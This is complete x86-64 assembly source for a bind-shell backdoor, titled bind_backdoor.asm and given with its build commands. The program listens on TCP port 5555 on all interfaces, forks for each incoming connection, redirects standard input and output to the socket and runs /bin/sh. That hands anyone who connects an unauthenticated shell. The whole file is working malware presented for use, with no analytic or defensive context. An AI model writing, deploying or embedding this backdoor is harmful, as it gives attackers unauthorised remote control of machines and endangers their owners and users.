; Coded by mmxm (@hc0d3r)
; [mmxm@hc0d3r asm]$ nasm -f elf64 bind_backdoor.asm
; [mmxm@hc0d3r asm]$ ld -o bind_backdoor bind_backdoor.o

;;; config

listen_port equ 5555

;;; system calls

sys_close equ 3
sys_dup2 equ 33
sys_socket equ 41
sys_accept equ 43
sys_bind equ 49
sys_listen equ 50
sys_setsockopt equ 54
sys_fork equ 57
sys_execve equ 59
sys_exit equ 60

;;; socket parameters values

sock_stream equ 1
af_inet equ 2
ipproto_tcp equ 6

;;; setsockopt parameters values

sol_socket equ 1
so_reuseaddr equ 2

;;; program
section .data

section .text
  global _start
_start:
  mov rbp, rsp

  ;sub rsp, 28 ; int sock_fd, int sock_accept, int setsockopt_option, struct sockaddr_in, char []

  sub rsp, 52

  mov rax, 0x0068732f6e69622f ; /bin/sh
  mov [rbp-36], rax
  lea rax, [rbp-36]
  mov [rbp-52], rax

  xor rax, rax
  mov [rbp-44], rax

  mov rax, sys_socket
  mov rdi, af_inet
  mov rsi, sock_stream
  mov rdx, ipproto_tcp
  call xsyscall

  mov dword [rbp-4], eax ; store sock_fd
  mov dword [rbp-8], 1

  mov rax, sys_setsockopt
  mov rdi, [dword rbp-4] ; sock_fd
  mov rsi, sol_socket
  mov rdx, so_reuseaddr
  lea r10, [rbp-8]
  mov r8, 4 ; sizeof rbp-8
  call xsyscall

  xor rcx, rcx
  mov word [rbp-24], af_inet ; sin_family
  mov word [rbp-22], ((listen_port & 0xff) << 8 | (listen_port >> 8)) ; htons(sin_port)
  mov dword [rbp-18], ecx ; sin_addr
  mov qword [rbp-16], rcx ; sin_zero

  mov rax, sys_bind
  lea rsi, [rbp-24] ; address of struct sockaddr_in
  mov rdx, 16 ; sizeof struct sockaddr_in
  ; * rdi already have the value of sock_fd
  call xsyscall

  mov rax, sys_listen
  mov rsi, 100
  call xsyscall

happy_loop:
  mov rax, sys_accept
  mov rdi, [dword rbp-4]
  xor rsi, rsi
  xor rdx, rdx
  call xsyscall

  mov dword [rbp-28], eax

  mov rax, sys_fork
  syscall

  cmp rax, 0
  je backdoor

  mov rax, sys_close
  mov rdi, [dword rbp-28]
  syscall

  jmp happy_loop

backdoor:
  mov rax, sys_close
  mov rdi, [dword rbp-4]
  syscall

  xor rdi, rdi
  mov rdi, 2

  close_e_dup:
    mov rax, sys_close
    syscall

    mov rsi, rdi

    mov rdi, [dword rbp-28]
    mov rax, sys_dup2
    syscall

    mov rdi, rsi

    dec rdi

  cmp rdi, 0
  jge close_e_dup

; execve("/bin/sh", ["/bin/sh"], [0])

  mov rax, sys_execve
  mov rdi, [rbp-52]
  lea rsi, [rbp-52]
  xor rdx, rdx
  syscall

  mov rax, sys_close
  mov rdi, [dword rbp-28]
  syscall


  jmp exit


xsyscall:
  syscall
  cmp eax, 0
  jl exit
  ret

exit:
  mov rax, sys_exit
  xor rdi, rdi
  syscall
